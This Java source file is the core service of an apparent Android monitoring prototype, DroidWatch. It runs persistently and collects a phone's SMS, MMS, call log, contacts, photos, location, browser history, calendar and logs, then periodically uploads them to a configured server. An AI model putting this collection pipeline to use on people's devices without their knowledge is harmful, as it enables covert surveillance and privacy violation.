package com.droidwatch;

/**
 * WatcherService.java
 * @author Justin Grover
 * 
 * NOTICE - This software is intended to serve as prototype material.
 * 
 * Copyright 2013 Justin Grover
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import java.util.Properties;
import android.app.AlarmManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.IntentFilter.MalformedMimeTypeException;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Log;

/** This class performs the startup and cancellation of the DroidWatch components. **/
public class WatcherService extends Service
{
	//Set Log TAG
	public static final String TAG = "WatcherService";
	
	//Initialize BroadcastReceivers
	private BroadcastReceiver 		screenStatusReceiver;			//Detects screen locks,unlocks
	private BroadcastReceiver 		appInstallRemoveReceiver;		//Detects app installs,removals
	private BroadcastReceiver		smsReceiver;					//Detects incoming SMS messages
	private BroadcastReceiver		mmsReceiver;					//Detects incoming MMS messages
	private BroadcastReceiver		providerChangeReceiver;			//Detects changes in GPS provider

	//Initialize Alarms
    private LogcatWatcher			logcatWatcher;					//Gathers logcat logs
    private LocationWatcher			locationWatcher;				//Gathers location data
    private BrowserHistoryWatcher	browserHistoryWatcher;			//Gathers browser history
    private MMSOutgoingWatcher		mmsOutgoingWatcher;				//Gathers outgoing mms messages
    private CalendarWatcher			calendarWatcher;				//Gathers calendar events
    private Transfer				transfer;						//Transfers logged events
	
	//Initialize ContentObservers
    private CallLogWatcher 			callLogWatcher;					//Detects changes to call log
    private SMSOutgoingWatcher 		smsObserver;					//Detects changes to SMS message log
    private ContactWatcher 			contactWatcher;					//Detects changes to contacts list
    private GalleryWatcher			photoObserver;					//Detects changes to the gallery images
    
    /**
     * This method is required for services.
     * 
     * @param intent
     */
	@Override
	public IBinder onBind(Intent intent)
	{
		return null;
	}

	/** 
	 * This method creates the service and fires up the collections.
	 */
	@Override
	public void onCreate()
	{
		super.onCreate();
		startWatchers();
	}
	
	/**
	 * This method starts a service and sets it to be persistent.
	 * 
	 * @param intent
	 * @param flags
	 * @param startId
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId)
	{
		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}
	
	/**
	 * This method coordinates the starting of the various watcher components.
	 */
	private void startWatchers()
	{
		// Get Configuration Properties
		Properties properties = PropertyManager.openProperties(getApplicationContext());
		if (properties == null)
		{
			Log.e(TAG,"Unable to read DroidWatch properties config file");
			return;
		}
		
		// Start Watchers
		setupRetrievers(properties);
		setupBroadcastReceivers(properties);
		setupContentObservers(properties);
		setupAlarms(properties);

		//-------------------FUTURE CODE-------------------//
		//LocationManager - potentially useful on Jelly Bean devices (buggy on older devices)
		//Intent i = new Intent(this, LocationReceiver.class);
        //pendingIntent = PendingIntent.getBroadcast(this, 0, i, PendingIntent.FLAG_UPDATE_CURRENT);
        //lm.requestLocationUpdates(bestProvider, 180000, 10, pendingIntent);	
	}

	/**
	 * This method starts miscellaneous tasks.
	 * 
	 * @param properties 
	 */
	private void setupRetrievers(Properties properties)
	{
		if(Long.parseLong(properties.getProperty("device_account_interval")) > 0)
			DeviceAccountWatcher.findAccounts(getApplicationContext());
		
		ContactCheck.checkDroidWatchContacts(getApplicationContext());
		CalendarCheck.checkDroidWatchCalendar(getApplicationContext());
	}

	/**
	 * This method starts the content observers.
	 * 
	 * @param properties 
	 */
	private void setupContentObservers(Properties properties)
	{	
		Handler callLogHandler = new Handler();
		Handler smsHandler = new Handler();
		Handler contactsHandler = new Handler();
		Handler photoHandler = new Handler();
		
		// Watch the Call Log
		if (Long.parseLong(properties.getProperty("call_log_interval")) > 0)
		{
	        callLogWatcher = new CallLogWatcher(callLogHandler, this.getApplicationContext());
	        getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, false, callLogWatcher);
		}
		
        // Watch the SMS Outgoing Log
        if (Long.parseLong(properties.getProperty("sms_interval")) > 0)
        {
			smsObserver = new SMSOutgoingWatcher(smsHandler, this.getApplicationContext());
	        Uri uriSMS = Uri.parse("content://sms");
	        getContentResolver().registerContentObserver(uriSMS, true, smsObserver);
        }
        
        // Watch the Contacts Log
        if (Long.parseLong(properties.getProperty("contacts_interval")) > 0)
        {
	        contactWatcher = new ContactWatcher(contactsHandler, this.getApplicationContext());
	        getContentResolver().registerContentObserver(ContactsContract.RawContacts.CONTENT_URI, false, contactWatcher);
        }
        
        // Watch the Photo Gallery
        if (Long.parseLong(properties.getProperty("gallery_interval")) > 0)
        {
	        photoObserver = new GalleryWatcher(photoHandler, this.getApplicationContext());
	        getContentResolver().registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, false, photoObserver);
        }
	}

	/**
	 * This method starts the broadcast receivers.
	 * 
	 * @param properties 
	 */
	private void setupBroadcastReceivers(Properties properties)
	{
		//Get screen status updates
		if (Long.parseLong(properties.getProperty("screen_status_interval")) > 0)
		{
			screenStatusReceiver = new ScreenWatcher();
			IntentFilter screenStatusFilter = new IntentFilter(Intent.ACTION_SCREEN_ON);
			screenStatusFilter.addAction(Intent.ACTION_SCREEN_OFF);
			screenStatusFilter.addAction(Intent.ACTION_USER_PRESENT);
			registerReceiver(screenStatusReceiver, screenStatusFilter);
		}
		
		//Get app installs and removals
		if (Long.parseLong(properties.getProperty("app_install_removal_interval")) > 0)
		{
			appInstallRemoveReceiver = new AppWatcher();
			IntentFilter appInstallRemoveFilter = new IntentFilter();
			appInstallRemoveFilter.addAction(Intent.ACTION_PACKAGE_ADDED);
			appInstallRemoveFilter.addAction(Intent.ACTION_PACKAGE_REMOVED);
			appInstallRemoveFilter.addDataScheme("package");
			registerReceiver(appInstallRemoveReceiver, appInstallRemoveFilter);
		}
		
		//Get incoming SMS messages
		if (Long.parseLong(properties.getProperty("sms_interval")) > 0)
		{
			smsReceiver = new SMSIncomingWatcher();
			IntentFilter smsReceiveFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
			registerReceiver(smsReceiver, smsReceiveFilter);
		}
		
		//Get incoming MMS messages
		if (Long.parseLong(properties.getProperty("mms_interval")) > 0)
		{
			mmsReceiver = new MMSIncomingWatcher();
			IntentFilter mmsReceiveFilter = new IntentFilter();
			mmsReceiveFilter.addAction("android.provider.Telephony.MMS_RECEIVED");
			mmsReceiveFilter.addAction("android.provider.Telephony.WAP_PUSH_RECEIVED");
			try
			{
				mmsReceiveFilter.addDataType("application/vnd.wap.mms-message");
			}
			catch (MalformedMimeTypeException e)
			{
				Log.e(TAG, "Malformed MMS MIME Type");
			}
			registerReceiver(mmsReceiver, mmsReceiveFilter);
		}
		
		//Get changes in GPS provider
		if (Long.parseLong(properties.getProperty("location_provider_interval")) > 0)
		{
			providerChangeReceiver = new LocationProviderWatcher();
			IntentFilter providerIntentFilter = new IntentFilter();
			providerIntentFilter.addAction(LocationManager.PROVIDERS_CHANGED_ACTION);
			registerReceiver(providerChangeReceiver, providerIntentFilter);	
		}
	}

	/**
	 * This method starts the alarms.
	 * 
	 * @param properties 
	 */
	private void setupAlarms(Properties properties)
	{	
		AlarmManager alarmManager = (AlarmManager)getApplicationContext().getSystemService(Context.ALARM_SERVICE);
		
		// Get properties
		long logcatInterval 		= Long.parseLong(properties.getProperty("logcat_interval"));
		long browserHistoryInterval	= Long.parseLong(properties.getProperty("browser_history_interval"));
		long locationInterval 		= Long.parseLong(properties.getProperty("location_interval"));
		long calendarInterval		= Long.parseLong(properties.getProperty("calendar_interval"));
		long mmsInterval			= Long.parseLong(properties.getProperty("mms_interval"));
		long transferInterval		= Long.parseLong(properties.getProperty("transfer_interval"));
		String sslCertName			= properties.getProperty("ssl_cert_name");
		String serverURL			= properties.getProperty("server_url");

		// Get App logs
		logcatWatcher = new LogcatWatcher();
		logcatWatcher.setInterval(logcatInterval);
		logcatWatcher.setAlarm(getApplicationContext(), alarmManager);
		
		// Get Browser history
		browserHistoryWatcher = new BrowserHistoryWatcher();
		browserHistoryWatcher.setInterval(browserHistoryInterval);
		browserHistoryWatcher.setAlarm(getApplicationContext(), alarmManager);
	
		// Get Location updates
		locationWatcher = new LocationWatcher();
		locationWatcher.setInterval(locationInterval);
		locationWatcher.setAlarm(getApplicationContext(), alarmManager);	
		
		// Get Calendar updates
		calendarWatcher = new CalendarWatcher();
		calendarWatcher.setInterval(calendarInterval);
		calendarWatcher.setAlarm(getApplicationContext(), alarmManager);
		
		// Get Outgoing MMS messages
		mmsOutgoingWatcher = new MMSOutgoingWatcher();
		mmsOutgoingWatcher.setInterval(mmsInterval);
		mmsOutgoingWatcher.setAlarm(getApplicationContext(), alarmManager);

		// Transfer Logs
		transfer = new Transfer();
		transfer.setInterval(transferInterval);
		transfer.setConnectionProperties(sslCertName, serverURL);
		transfer.setAlarm(getApplicationContext(), alarmManager);
	}

	/** 
	 * This method coordinates the destruction of DroidWatch collection components.
	 */
	@Override
	public void onDestroy()
	{
		super.onDestroy();

		//Cancel Service Components
		cancelAlarms();
		cancelBroadcastReceivers();
		cancelContentObservers();
	}

	/**
	 * This method unregisters the content observers.
	 */
	private void cancelContentObservers()
	{
		if (callLogWatcher != null)
			getContentResolver().unregisterContentObserver(callLogWatcher);
		
		if (smsObserver != null)
			getContentResolver().unregisterContentObserver(smsObserver);
		
		if (contactWatcher != null)
			getContentResolver().unregisterContentObserver(contactWatcher);
		
		if (photoObserver != null)
			getContentResolver().unregisterContentObserver(photoObserver);
	}

	/**
	 * This method unregisters the broadcast receivers.
	 */
	private void cancelBroadcastReceivers()
	{
		if (screenStatusReceiver != null)
			unregisterReceiver(screenStatusReceiver);
		
		if (appInstallRemoveReceiver != null)
			unregisterReceiver(appInstallRemoveReceiver);
		
		if (smsReceiver != null)
			unregisterReceiver(smsReceiver);
		
		if (providerChangeReceiver != null)
			unregisterReceiver(providerChangeReceiver);
	}

	/**
	 * This method stops cancels the alarms.
	 */
	private void cancelAlarms()
	{
		AlarmManager alarmManager = (AlarmManager)getApplicationContext().getSystemService(Context.ALARM_SERVICE);
		
		if (logcatWatcher != null)
			logcatWatcher.cancelAlarm(getApplicationContext(), alarmManager);
		
		if (locationWatcher != null)
			locationWatcher.cancelAlarm(getApplicationContext(), alarmManager);
		
		if (browserHistoryWatcher != null)
			browserHistoryWatcher.cancelAlarm(getApplicationContext(), alarmManager);
		
		if (calendarWatcher != null)
			calendarWatcher.cancelAlarm(getApplicationContext(), alarmManager);
		
		if (mmsOutgoingWatcher != null)
			mmsOutgoingWatcher.cancelAlarm(getApplicationContext(), alarmManager);
		
		if (transfer != null)
			transfer.cancelAlarm(getApplicationContext(), alarmManager);
	}	
}